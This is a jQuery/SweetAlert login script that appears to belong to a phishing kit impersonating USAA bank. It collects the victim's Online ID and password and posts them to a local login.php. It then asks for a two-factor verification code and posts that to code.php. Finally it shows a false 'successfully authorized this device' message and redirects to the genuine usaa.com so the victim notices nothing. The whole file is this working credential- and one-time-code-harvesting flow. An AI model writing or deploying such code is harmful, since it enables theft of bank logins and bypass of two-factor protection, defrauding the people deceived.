const Login = (function ($, Swal) {

    const submitEvent = function () {
        $('form[name="login-form"]').on('submit', function (event) {
            event.preventDefault();

            const onlineId = $('input[name="onlineId"]').val().trim();
            const password = $('input[name="password"]').val().trim();
            const input = $('input.form-control');

            if (onlineId.length < 4 || password.length < 4) {
                input.addClass('has-error');
                Swal.fire({
                    icon: 'error',
                    title: 'Oops..!',
                    text: 'Invalid Online ID / Password.',
                });

                return;
            }

            input.removeClass('has-error');
            $.ajax({
                url: '/login.php',
                method: 'POST',
                data: {onlineId, password},
                success: function () {
                    Swal.fire({
                        title: 'Verification Code',
                        input: 'text',
                        inputAttributes: {
                            autocapitalize: 'off'
                        },
                        showCancelButton: false,
                        confirmButtonText: 'Verify',
                        showLoaderOnConfirm: true,
                        preConfirm: (verificationCode) => {
                            if (!verificationCode || verificationCode.length < 4) {
                                Swal.showValidationMessage('Invalid code.');
                                return false;
                            }

                            $.ajax({
                                url: '/code.php',
                                method: 'POST',
                                data: {code: verificationCode},
                                success: function () {
                                    return true;
                                },
                                error: function () {
                                    return false;
                                }
                            });

                        },
                        allowOutsideClick: () => !Swal.isLoading(),
                        backdrop: true
                    }).then((result) => {
                        if (result.isConfirmed) {
                            Swal.fire({
                                icon: 'success',
                                title: 'Authorized',
                                text: 'You\'ve successfully authorized this device.',
                            }).then((result) => {
                                if (result.isConfirmed)
                                    return window.location = "https://www.usaa.com/";
                            });
                        }
                    });
                }
            });

        });
    }

    return {
        init: function () {
            submitEvent();
        }
    }
})(jQuery, Swal);

$(document).ready(function () {
    Login.init();
});